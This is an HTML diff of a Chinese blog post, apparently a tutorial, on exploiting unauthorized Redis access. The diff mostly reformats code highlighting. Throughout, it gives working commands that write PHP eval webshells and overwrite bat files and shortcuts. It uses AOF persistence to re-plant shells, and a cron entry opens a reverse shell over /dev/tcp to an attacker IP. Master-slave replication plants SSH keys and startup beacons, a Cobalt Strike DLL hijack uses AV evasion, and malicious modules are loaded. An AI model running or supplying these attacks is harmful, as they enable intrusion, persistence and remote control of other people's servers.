 <h5 id="Windows文件覆盖"><a href="#Windows文件覆盖" class="headerlink" title="Windows文件覆盖"></a>Windows文件覆盖</h5><p>有时候目标服务器一直不会重启，那么可以考虑覆盖一些其他的bat文件等来增加触发几率，可以利用<code>EVAL "return dofile('xxx') 0</code>探测文件是否真的存在。PHPStudy环境中的bat文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9e48cf26937d98b3a102eb6b412dd96b.png"><br>通过Redis默认的dir参数可以知道绝对路径：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/0b77db0e5556150ce63a48b52033dc8a.png"><br>比如覆盖Apache下的check.bat脚本(如果触发后就会执行命令):</p>
-<pre><code class="python">config set dir "D:/phpstudy_pro/Extensions/Apache2.4.39/bin"
-config set dbfilename check.bat
-set x "\r\n\r\nhttpd.exe\r\ncmd /c calc\r\npause &gt; nul\r\n"
-save</code></pre>
+<pre class="line-numbers language-python"><code class="language-python">config set dir <span class="token string">"D:/phpstudy_pro/Extensions/Apache2.4.39/bin"</span>
+config set dbfilename check<span class="token punctuation">.</span>bat
+set x <span class="token string">"\r\n\r\nhttpd.exe\r\ncmd /c calc\r\npause > nul\r\n"</span>
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/fc91a408ddc88709de58aba050248a44.png"></p>
 <h5 id="WEB绝对路径写Wbeshell"><a href="#WEB绝对路径写Wbeshell" class="headerlink" title="WEB绝对路径写Wbeshell"></a>WEB绝对路径写Wbeshell</h5><p>如果Redis环境中同时存在WEB环境，在Redis权限比较高的情况下，可以尝试获取到绝对路径后写入Webshell，一般以二进制文件启动的程序是启动用户的权限，比较适合利用，以安装服务(yum install redis)等启动的权限会比较有限。</p>
 <p>Windows+PHPStudy:</p>
-<pre><code class="python">config set dir "D:/phpstudy_pro/WWW" 
-config set dbfilename redisshell.php
-set x "\r\n\r\n&lt;?php eval($_GET[1]);?&gt;\r\n\r\n"
-save</code></pre>
+<pre class="line-numbers language-python"><code class="language-python">config set dir <span class="token string">"D:/phpstudy_pro/WWW"</span> 
+config set dbfilename redisshell<span class="token punctuation">.</span>php
+set x <span class="token string">"\r\n\r\n&lt;?php eval($_GET[1]);?>\r\n\r\n"</span>
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f9bae99834a2ca2f2665c1b9b660413d.png"></p>
 <p>在CentOS+PHPStudy下：</p>
-<pre><code class="python">config set dir "/var/www/html" 
-config set dbfilename redisshell.php
-set x "\n\n&lt;?php eval($_GET[1]);?&gt;\n\n"
-save</code></pre>
+<pre class="line-numbers language-python"><code class="language-python">config set dir <span class="token string">"/var/www/html"</span> 
+config set dbfilename redisshell<span class="token punctuation">.</span>php
+set x <span class="token string">"\n\n&lt;?php eval($_GET[1]);?>\n\n"</span>
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2ef26d7345cd7a1e6e20a88abe52e49e.png"></p>
 <p>Centos + Apache下:</p>
-<pre><code class="python">config set dir "/var/www/html" 
-config set dbfilename redisshell.php
-set x "\n\n&lt;?php eval($_GET[1]);?&gt;\n\n"
-save</code></pre>
+<pre class="line-numbers language-python"><code class="language-python">config set dir <span class="token string">"/var/www/html"</span> 
+config set dbfilename redisshell<span class="token punctuation">.</span>php
+set x <span class="token string">"\n\n&lt;?php eval($_GET[1]);?>\n\n"</span>
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f8df2ca875ec434336e7d9fd60513394.png"><br>如果权限不足，无法写入：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2e23b73f321efe0a5d5a5fbba526a674.png"></p>
 <h4 id="AOF-配置重写持久化"><a href="#AOF-配置重写持久化" class="headerlink" title="AOF+配置重写持久化"></a>AOF+配置重写持久化</h4><p>由于不能设置appendfilename参数，不能AOF写任意后缀文件。但是可以通过该方式进行权限维持，在配置文件开启AOF后，Redis在重启后会执行其中的命令以恢复数据，结合配置文件重写达到redis在重启后写入webshell的效果(save之类的命令不会被aof记录)，执行命令：</p>
-<pre><code class="python">#每秒保存命令（如果已经在默认位置存在aof文件，就使用该配置保存命令，不要使用bgrewriteaof，redis会优先恢复默认目录的aof,用该命令控制写入aof的内容即可。）
-#config set appendfsync everysec
-#关闭只读
-CONFIG SET slave-read-only no      
-#设置持久化数据保存目录
-config set dir "D:/phpstudy_pro/WWW/Redis"   
-#设置RDB文件名
-config set dbfilename redisshell.php  
-#设置一个key
-set x "\r\n\r\n&lt;?php eval($_GET[1]);?&gt;\r\n\r\n"   
-#设置aof增长重写幅度，1kb涨到1.5kb就重写
-config set auto-aof-rewrite-percentage 50
-#设置AOF文件最小重写的大小（字节）。第一次达到1mb就重写
-config set auto-aof-rewrite-min-size 10000
-#表示10秒内如果至少有 1 个 key 的值变化，则保存rdb
-config set save "10 1"  
- #将内存中执行的命令保存到aof文件
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#每秒保存命令（如果已经在默认位置存在aof文件，就使用该配置保存命令，不要使用bgrewriteaof，redis会优先恢复默认目录的aof,用该命令控制写入aof的内容即可。）</span>
+<span class="token comment" spellcheck="true">#config set appendfsync everysec</span>
+<span class="token comment" spellcheck="true">#关闭只读</span>
+CONFIG SET slave<span class="token operator">-</span>read<span class="token operator">-</span>only no      
+<span class="token comment" spellcheck="true">#设置持久化数据保存目录</span>
+config set dir <span class="token string">"D:/phpstudy_pro/WWW/Redis"</span>   
+<span class="token comment" spellcheck="true">#设置RDB文件名</span>
+config set dbfilename redisshell<span class="token punctuation">.</span>php  
+<span class="token comment" spellcheck="true">#设置一个key</span>
+set x <span class="token string">"\r\n\r\n&lt;?php eval($_GET[1]);?>\r\n\r\n"</span>   
+<span class="token comment" spellcheck="true">#设置aof增长重写幅度，1kb涨到1.5kb就重写</span>
+config set auto<span class="token operator">-</span>aof<span class="token operator">-</span>rewrite<span class="token operator">-</span>percentage <span class="token number">50</span>
+<span class="token comment" spellcheck="true">#设置AOF文件最小重写的大小（字节）。第一次达到1mb就重写</span>
+config set auto<span class="token operator">-</span>aof<span class="token operator">-</span>rewrite<span class="token operator">-</span>min<span class="token operator">-</span>size <span class="token number">10000</span>
+<span class="token comment" spellcheck="true">#表示10秒内如果至少有 1 个 key 的值变化，则保存rdb</span>
+config set save <span class="token string">"10 1"</span>  
+ <span class="token comment" spellcheck="true">#将内存中执行的命令保存到aof文件</span>
  bgrewriteaof
- #开启AOF持久化
+ <span class="token comment" spellcheck="true">#开启AOF持久化</span>
 config set appendonly yes
- #重写配置
-CONFIG REWRITE                       </code></pre>
+ <span class="token comment" spellcheck="true">#重写配置</span>
+CONFIG REWRITE                       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>由于在10秒内设置了key,触发保存规则，写入了PHP文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f89cc1a5cae127346a6582c753dea373.png"><br>模拟管理员删除PHP文件、然后重启Redis、Redis工作后的键写入:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/db05612d3c4eae8e9499a12e2bf884d5.gif"></p>
 <h3 id="主从复制无损写文件-master-slave模式"><a href="#主从复制无损写文件-master-slave模式" class="headerlink" title="主从复制无损写文件(master/slave模式)"></a>主从复制无损写文件(master/slave模式)</h3><p>Redis&gt;=2.8，支持主从复制功能，通过主从复制Redis-slave会将Redis-master的数据库文件同步到本地。攻击者可以伪造一个master，通过控制数据库文件可以在slave中写入无损的文件。利用命令来设置主服务器<code>SLAVEOF host port / REPLICAOF host port</code>(REPLICAOF &gt; 5.0.0) ，执行命令后的Redis身份会切换为从服务器，然后通过与主服务器交互进行数据同步，但是会导致目标Redis数据丢失，可以使用<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yanjieli/p/13085481.html">redis-dump</a>、redis-load等第三方工具进行数据备份导出，也可以在目标Redis上设置rdb、aof备份。利用 <a target="_blank" rel="noopener" href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a> 脚本模拟master测试利用(需要网络互通,否则脚本会卡在从机连接位置)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/44800dff8965ebaa84c88b226962fb81.png"></p>
-<h4 id="Linux写SSH公钥-1"><a href="#Linux写SSH公钥-1" class="headerlink" title="Linux写SSH公钥"></a>Linux写SSH公钥</h4><pre><code class="python">python3 RedisWriteFile.py --rhost 192.168.11.133 --rport 6379 --lhost 192.168.11.1 --lport 16379 --rpath "/root/.ssh" --rfile authorized_keys --lfile ./SSH/authorized_keys</code></pre>
+<h4 id="Linux写SSH公钥-1"><a href="#Linux写SSH公钥-1" class="headerlink" title="Linux写SSH公钥"></a>Linux写SSH公钥</h4><pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.133</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"/root/.ssh"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile authorized_keys <span class="token operator">-</span><span class="token operator">-</span>lfile <span class="token punctuation">.</span><span class="token operator">/</span>SSH<span class="token operator">/</span>authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/85962012cf8bcebde873f98e9707d9eb.png"></p>
 <h4 id="Linux写计划任务-1"><a href="#Linux写计划任务-1" class="headerlink" title="Linux写计划任务"></a>Linux写计划任务</h4><p>在Windows下编写Linux的计划任务文件注意<code>\r\n</code>换行要变成<code>\n\n</code>,Ubuntu计划任务文件尾行需要换行：</p>
-<pre><code class="python">SHELL=/bin/bash
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.11.1/6667 0&gt;&amp;1
-</code></pre>
+<pre class="line-numbers language-python"><code class="language-python">SHELL<span class="token operator">=</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash
+PATH<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>bin<span class="token punctuation">:</span><span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>bin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin
+<span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> root bash <span class="token operator">-</span>i <span class="token operator">></span><span class="token operator">&amp;</span> <span class="token operator">/</span>dev<span class="token operator">/</span>tcp<span class="token operator">/</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span><span class="token operator">/</span><span class="token number">6667</span> <span class="token number">0</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>脚本执行命令：</p>
-<pre><code class="python">python3 RedisWriteFile.py --rhost 192.168.11.133 --rport 6379 --lhost 192.168.11.1 --lport 16379 --rpath "/etc/cron.d" --rfile shell --lfile ./cron/cron.d</code></pre>
+<pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.133</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"/etc/cron.d"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile shell <span class="token operator">-</span><span class="token operator">-</span>lfile <span class="token punctuation">.</span><span class="token operator">/</span>cron<span class="token operator">/</span>cron<span class="token punctuation">.</span>d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>反弹成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/556c48f2fd6871459c7122db487e6afe.png"></p>
-<h4 id="Windows写启动项-1"><a href="#Windows写启动项-1" class="headerlink" title="Windows写启动项"></a>Windows写启动项</h4><pre><code class="python">python3 RedisWriteFile.py --rhost 192.168.200.97 --rport 6379 --lhost 192.168.200.138 --lport 16379 --rpath "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp" --rfile beacon.exe --lfile beacon.exe</code></pre>
+<h4 id="Windows写启动项-1"><a href="#Windows写启动项-1" class="headerlink" title="Windows写启动项"></a>Windows写启动项</h4><pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.97</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.138</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile beacon<span class="token punctuation">.</span>exe <span class="token operator">-</span><span class="token operator">-</span>lfile beacon<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/575cd5cb885b8c831ad1805f222eeac9.png"></p>
 <h4 id="Windows文件覆盖-新增"><a href="#Windows文件覆盖-新增" class="headerlink" title="Windows文件覆盖/新增"></a>Windows文件覆盖/新增</h4><p>现在可以对一些常用位置的文件进行覆盖了，如桌面快捷方式、快速启动栏、软件程序、动态链接库等。这些操作基本上都是需要管理员权限的。</p>
 <h5 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h5><p>先使用文件探测方式探测是否存在常见的快捷方式并确认好启动文件位置，一般在公用桌面存在一些：</p>
-<pre><code class="python">EVAL "return dofile('C:/Users/Public/Desktop/Google Chrome.lnk')" 0
-EVAL "return dofile('C:/Users/Public/Desktop/Notepad++.lnk')" 0</code></pre>
+<pre class="line-numbers language-python"><code class="language-python">EVAL <span class="token string">"return dofile('C:/Users/Public/Desktop/Google Chrome.lnk')"</span> <span class="token number">0</span>
+EVAL <span class="token string">"return dofile('C:/Users/Public/Desktop/Notepad++.lnk')"</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>在本地建立快捷方式 ，根据在目标主机上获取的文件位置信息可以在快捷方式的目标中写入命令<code>C:\Windows\System32\cmd.exe /c calc &amp;  "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"</code> ，将运行方式设置为最小化：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/6e1b28cea83b9a7b8e6d7da489374659.png"><br>执行脚本同步：</p>
-<pre><code class="python">python3 RedisWriteFile.py --rhost 192.168.200.97 --rport 6379 --lhost 192.168.200.138 --lport 16379 --rpath "C:/Users/Public/Desktop" --rfile "Google Chrome.lnk" --lfile "Google Chrome.lnk"</code></pre>
+<pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.97</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.138</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"C:/Users/Public/Desktop"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile <span class="token string">"Google Chrome.lnk"</span> <span class="token operator">-</span><span class="token operator">-</span>lfile <span class="token string">"Google Chrome.lnk"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/093ab56ed159388b827b9b47d7f641b7.gif"></p>
 <h5 id="快速启动栏"><a href="#快速启动栏" class="headerlink" title="快速启动栏"></a>快速启动栏</h5><p>在文件夹<code>%AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar</code>中，可以修改，但是测试新增文件并不会在任务栏显示。<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/af92092b9edcc756437a953dc0962cdc.png"></p>
 <h5 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h5><p>开启Process Monitor监控，然后启动Redis，观察到Redis在其安装目录加载了<code>dbghelp.dll</code>和<code>CRYPTBASE.DLL</code>两个DLL,这两个DLL本来是在系统目录中的，加载过程中存在了DLL加载顺序的劫持（DLL劫持相关基础可以查看<a href="https://yanghaoi.github.io/2021/11/18/dll-jie-chi/">DLL劫持漏洞</a>）：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c698ca3d8fc6bf984232694d40a3e131.png"><br>查看进程的架构为x64，作为漏洞利用的DLL也需要是相同架构：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2cb69eba140ae0b8ab41cb68f923aad4.png"></p>
 <p>生成完成后可以使用<code>dumpbin /headers xxx.dll</code>命令确认，或者在010 Editor下打开后查看PE后面的16进制，x64为8664，x86为014C(用记事本打开二进制文件查看字符串64位是<code>PE  d†</code>，32 位是<code>PE L</code>)，还可以使用exeinfope工具(吾爱破解工具包):<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9956b741c13fd911842ef7a119dad9c8.png"></p>
 <p>参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8153?page=3">Redis on Windows 出网利用探索</a> 一文中，DLL劫持可以由 <code>BGSAVE</code>等命令主动触发，命令触发后会创建线程来执行保存数据。生成<code>dbghelp.dll</code>的劫持用到的是 <a target="_blank" rel="noopener" href="https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie">Brownie</a>项目进行DLL的免杀，<a target="_blank" rel="noopener" href="https://github.com/monoxgas/Koppeling">Koppeling</a> 项目进行DLL函数代理转发构建：<br>1.生成Cobalt Strike的x64的DLL：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8b422092ae816be1b087546e7cab5b0b.png"><br>2.使用Brownie项目中的AES.py脚本加密Bin输出logo.png：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/5a54ed94e9bbf0458596813450794f48.png"><br>3.在Brownie中配置与加密脚本中一致的AES-KEY。<br>4.DLL中使用<code>CreateProcess</code>和<code>CreateRemoteThread</code>API组合创建进程注入shellcode（如果将shellcoode注入到Redis自身中，<code>basave</code>是无法返回beacon的。因为是异步执行产生子进程进行数据保存，保存完成后进程退出，创建的线程没有存活时间，所以这一步会看到WinExec可以正常执行，beacon无法返回，查看日志也可以看到<code>Background saving started by pid 2008</code>记录。另外注入自身内存(Redis启动时加载dbghelp.dll)，beacon的退出会导致Redis异常退出。）:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/84a5e8c8215a8c38f5104335ef0cd689.png"><br>5.生成项目DLL后使用Koppeling项目中的Python脚本来链接到转发DLL:</p>
-<pre><code class="python">python3 PyClone.py AES.dll C:\windows\system32\dbghelp.dll -o dbghelp.dll</code></pre>
+<pre class="line-numbers language-python"><code class="language-python">python3 PyClone<span class="token punctuation">.</span>py AES<span class="token punctuation">.</span>dll C<span class="token punctuation">:</span>\windows\system32\dbghelp<span class="token punctuation">.</span>dll <span class="token operator">-</span>o dbghelp<span class="token punctuation">.</span>dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e4db3f27a21559bd617154e98f92969c.png"><br>6.使用Redis主从同步脚本写入后执行<code>bgsave</code>触发DLL劫持：</p>
-<pre><code class="python">python3 RedisWriteFile.py --rhost 192.168.200.97 --rport 6379 --lhost 192.168.200.138 --lport 16379 --rpath "D:/phpstudy_pro/Extensions/redis3.0.504" --rfile "dbghelp.dll" --lfile "dbghelp.dll"</code></pre>
+<pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.97</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.138</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"D:/phpstudy_pro/Extensions/redis3.0.504"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile <span class="token string">"dbghelp.dll"</span> <span class="token operator">-</span><span class="token operator">-</span>lfile <span class="token string">"dbghelp.dll"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/188376a7149dc5dbc46e0a67415437cc.gif"></p>
 <p>注：在第四步中，</p>
 <h3 id="Redis模块"><a href="#Redis模块" class="headerlink" title="Redis模块"></a>Redis模块</h3><p>在Redis4.0或更高版本中，支持了自定义<a target="_blank" rel="noopener" href="https://redis.io/modules">模块</a>，可以编写模块来执行命令，参考GitHub项目<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">RedisModules-ExecuteCommand</a>。利用主从复制写入文件后使用<code>module load xx.so</code>加载，通过模块扩展进行命令执行等操作，类似MySQL的UDF。操作命令如下:</p>
-<pre><code class="python">config set dir /tmp
-config set dbfilename system.so
-slaveof 192.168.11.1 16379  
-module load /tmp/exp.so
+<pre class="line-numbers language-python"><code class="language-python">config set dir <span class="token operator">/</span>tmp
+config set dbfilename system<span class="token punctuation">.</span>so
+slaveof <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span> <span class="token number">16379</span>  
+module load <span class="token operator">/</span>tmp<span class="token operator">/</span>exp<span class="token punctuation">.</span>so
 slaveof no one 
-system.exec 'id'
-#module  list #列出加载的模块
-#module unload xxx #根据list列出的名称卸载模块</code></pre>
+system<span class="token punctuation">.</span><span class="token keyword">exec</span> <span class="token string">'id'</span>
+<span class="token comment" spellcheck="true">#module  list #列出加载的模块</span>
+<span class="token comment" spellcheck="true">#module unload xxx #根据list列出的名称卸载模块</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>用RedisWriteFile脚本增加自动命令执行：</p>
-<pre><code class="python">python3 RedisWriteFile.py --rhost 192.168.11.133 --rport 6379 --lhost 192.168.11.1 --lport 16379 --rpath "/tmp" --rfile system.so --lfile system.so</code></pre>
+<pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.133</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"/tmp"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile system<span class="token punctuation">.</span>so <span class="token operator">-</span><span class="token operator">-</span>lfile system<span class="token punctuation">.</span>so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/80a9d6fc69b3481dcf76d78ab3e90615.png"></p>
 <p>Windows版本用于执行命令的模块：<a target="_blank" rel="noopener" href="https://github.com/0671/RedisModules-ExecuteCommand-for-Windows">RedisModules-ExecuteCommand-for-Windows</a> ：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/60da50d286254d094d975df3f6eceaa3.png"><br>同时这位师傅已经开发出了完整的利用工具：<a target="_blank" rel="noopener" href="https://github.com/0671/RabR">RabR</a></p>
 <h2 id="0x04-文末总结"><a href="#0x04-文末总结" class="headerlink" title="0x04 文末总结"></a>0x04 文末总结</h2><p>通过整理Redis漏洞相关资料后总结：Redis在&lt;3.2.0版本上默认配置上存在未授权漏洞，后续版本如果配置错误也会存在问题。针对未授权主要利用rdb数据库文件写入、主从复制写入和模块加载来利用，同时发现结合AOF配置可以进行自动写shell的方法。针对windows上dll劫持的利用也进行了深入分析，达到比较完美的利用。更是发现了GitHub上几位师傅开发的工具，利用起来非常方便。最后在使用脚本之前一定要注意数据的备份方便后续恢复。</p>
@@ -1429,7 +1430,7 @@ system.exec 'id'
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">38.1k</span>&nbsp;字
+                class="white-color">37.8k</span>&nbsp;字
             
             
             
